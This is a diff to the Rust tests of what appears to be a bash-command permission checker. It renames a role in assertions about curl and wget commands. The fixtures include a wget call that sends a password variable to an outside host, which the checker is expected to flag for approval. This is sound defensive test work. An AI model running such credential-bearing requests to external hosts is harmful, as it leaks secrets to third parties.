@@ -11012,7 +11012,7 @@ mod tests {
             format!(r#"wget -q -O - --user=me --password="$PASS" {elsewhere}"#),
             format!(r#"wget -q -O - -U "$UA" {elsewhere}"#),
         ] {
-            assert_eq!(bash(&cmd, Role::SoloBuild, d), Decision::Ask, "{cmd}");
+            assert_eq!(bash(&cmd, Role::Build, d), Decision::Ask, "{cmd}");
         }
         // Own host: the same shapes still run (0.20 text-as-text).
         for cmd in [
@@ -11021,7 +11021,7 @@ mod tests {
             format!(r#"curl -s {own} -w "%{{http_code}}""#),
             format!(r#"wget -q -O - --header "X: $(date +%s)" {own}"#),
         ] {
-            assert_eq!(bash(&cmd, Role::SoloBuild, d), Decision::Allow, "{cmd}");
+            assert_eq!(bash(&cmd, Role::Build, d), Decision::Allow, "{cmd}");
         }
         // Elsewhere without a secret-bearing header or body: a plain GET.
         for cmd in [
@@ -11030,7 +11030,7 @@ mod tests {
             format!(r#"curl -s {elsewhere} -A "probe/1.0" -w "%{{http_code}}""#),
             format!(r#"curl -s {elsewhere} -e "https://example.com/""#),
         ] {
-            assert_eq!(bash(&cmd, Role::SoloBuild, d), Decision::Allow, "{cmd}");
+            assert_eq!(bash(&cmd, Role::Build, d), Decision::Allow, "{cmd}");
         }
     }
 
